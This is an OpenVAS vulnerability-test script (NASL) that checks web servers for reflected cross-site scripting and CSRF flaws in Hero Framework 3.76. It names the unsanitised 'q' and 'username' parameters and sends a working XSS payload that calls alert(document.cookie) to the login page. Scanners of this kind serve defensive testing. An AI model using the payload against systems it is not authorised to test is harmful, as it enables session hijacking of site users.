###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_hero_framework_mult_xss_n_csrf_vuln.nasl 11 2013-10-27 10:12:02Z jan $
#
# Hero Framework Cross-Site Scripting and Request Forgery Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attacker to execute arbitrary HTML and
  script code in a user's browser session in context of an affected site.
  Impact Level: Application";

tag_affected = "Hero Framework version 3.76";
tag_insight = "- Input passed to the 'q' parameter in search and 'username' parameter in
    users/login (when 'errors' is set to 'true') is not properly sanitised
    before being returned to the user.
  - The application allows users to perform certain actions via HTTP requests
    without performing any validity checks to verify the requests.";
tag_solution = "No solution or patch is available as of 16th January, 2013. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.heroframework.com/download";
tag_summary = "This host is installed with Hero Framework and is prone to multiple
  cross site scripting and CSRF vulnerabilities.";

if(description)
{
  script_id(803155);
  script_version("$Revision: 11 $");
  script_bugtraq_id(57035);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:N/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-01-16 14:02:15 +0530 (Wed, 16 Jan 2013)");
  script_name("Hero Framework Cross-Site Scripting and Request Forgery Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.osvdb.org/88731");
  script_xref(name : "URL" , value : "http://www.osvdb.org/88732");
  script_xref(name : "URL" , value : "http://www.osvdb.org/88733");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/51668");
  script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/57035");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/80796");
  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/119470");
  script_xref(name : "URL" , value : "http://seclists.org/fulldisclosure/2013/Jan/62");
  script_xref(name : "URL" , value : "http://www.darksecurity.de/advisories/2012/SSCHADV2012-023.txt");

  script_description(desc);
  script_summary("Check if Hero Framework is vulnerable to XSS");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0){
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

port = "";
dir = "";

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
 port = 80;
}

## Check the port status
if(!get_port_state(port)){
 exit(0);
}

## Check the php support
if(!can_host_php(port:port)){
  exit(0);
}

## iterate over the possible paths
foreach dir (make_list("", "/hero_os", "/framework", "/hero", cgi_dirs()))
{
  ## Application Confirmation
  if(http_vuln_check(port:port, url:dir + "/index.php",
     pattern:">Welcome to Hero!<", check_header:TRUE,
     extra_check:make_list('>Hero</', '>Member Login<')))
  {
    ## Construct attack request
    url = string(dir, '/users/login?errors=true&username=";></style><' +
                 '/script><script>alert(document.cookie)</script>');

    ## Check the response to confirm vulnerability
    if(http_vuln_check(port:port, url:url, check_header:TRUE,
       pattern:"</script><script>alert\(document.cookie\)</script>",
       extra_check:">Password<"))
    {
      security_warning(port);
      exit(0);
    }
  }
}
